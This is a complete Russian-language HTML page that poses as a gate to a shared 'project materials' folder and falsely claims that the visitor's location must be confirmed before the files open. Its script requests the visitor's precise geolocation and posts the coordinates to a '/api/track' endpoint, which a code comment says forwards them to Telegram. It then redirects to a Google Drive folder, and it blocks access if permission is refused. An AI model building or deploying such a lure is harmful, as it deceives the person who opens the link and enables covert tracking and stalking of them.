<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Доступ к материалам</title>
  <style>
    body {
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background: #f0f2f5;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    button {
      padding: 16px 32px;
      font-size: 17px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:disabled { background: #999; }
    #status { margin-top: 16px; color: #555; max-width: 400px; }
  </style>
</head>
<body>
  <h2>📁 Материалы проекта</h2>
  <p>Для доступа к папке подтвердите своё местоположение</p>
  <button id="accessBtn">🔓 Подтвердить и открыть</button>
  <div id="status"></div>

  <script>
    const driveLink = "https://drive.google.com/drive/folders/1y_3OsXJUaq5E7OA8i6mzVe1-vAbEa4Eu?usp=drive_link";
    const btn = document.getElementById('accessBtn');
    const status = document.getElementById('status');

    btn.addEventListener('click', () => {
      if (!navigator.geolocation) {
        status.textContent = "Геолокация не поддерживается вашим браузером.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          // Отправляем координаты в Telegram
          try {
            await fetch('/api/track', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                latitude: lat,
                longitude: lon,
                accuracy: position.coords.accuracy
              })
            });
          } catch (e) {}

          status.textContent = "✅ Местоположение подтверждено! Открываю...";
          setTimeout(() => { window.location.href = driveLink; }, 1000);
        },
        (error) => {
          status.textContent = "❌ Без доступа к местоположению файлы не откроются. Разрешите геолокацию и попробуйте снова.";
          btn.disabled = true;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
  </script>
</body>
</html>
